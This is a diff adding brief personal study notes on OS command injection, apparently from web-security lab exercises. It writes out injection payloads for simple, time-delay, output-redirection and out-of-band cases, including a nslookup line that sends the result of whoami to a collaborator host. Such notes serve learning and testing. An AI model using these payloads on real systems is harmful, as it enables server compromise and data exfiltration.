@@ -1,0 +1,62 @@
+
+
+#OS Command Injection#
+	
+	[OS Command Injection -Simple Case]
+	
+		modify the storeID=1parameter.. giving it the value 1|whoami/id
+		
+		
+		
+	[Blind-OS command injection with time delays]
+	
+	
+		remove the email value add os command as vaule in submit-form
+			
+			email=email=& sleep 10 #		-plaintext
+			email%3d%26+sleep+10+%23		-url encoding
+			
+			
+			another testing, add | symbol as value while submiting the value, it vulerable it will return ERROR
+			
+		if its vulnerable to command injection, it then returns response after 10 seconds.
+
+
+
+
+	[Blind OS command injection with output redirection]
+		
+		
+		for blind-os command, use <& sleep 10> to check vulerability, remove the email value add os command as vaule in submit-form
+			
+			email=email=& sleep 10 #		-plaintext
+			email%3d%26+sleep+10+%23		-url encoding
+			
+			return response 10 sec later
+			
+			
+		after finding to vulerable OS command path, browse the website and find image directory path. threr is image path /image?filename=1.png
+			
+			email=whoami > /var/www/images/user.txt #
+			email=%26+whoami+>+/var/www/images/user.txt+%23 	|| encoding url
+			
+			
+			GET /image?filename=user.txt						|| this will return user-name 
+			
+
+
+	
+	[Blind OS command injection with out-of-band data exfiltration]
+	
+	
+		as email field is vulnerable in the forms
+		
+			& nslookup fdfasdf343r423rf.brupcollaborator.net #
+			& nslookup 'whoami'.fdfasdf343r423rf.brupcollaborator.net #
+			& nslookup $(whoami).fdfasdf343r423rf.brupcollaborator.net #			
+			
+		
+		check reponse 
+		
+    
+    
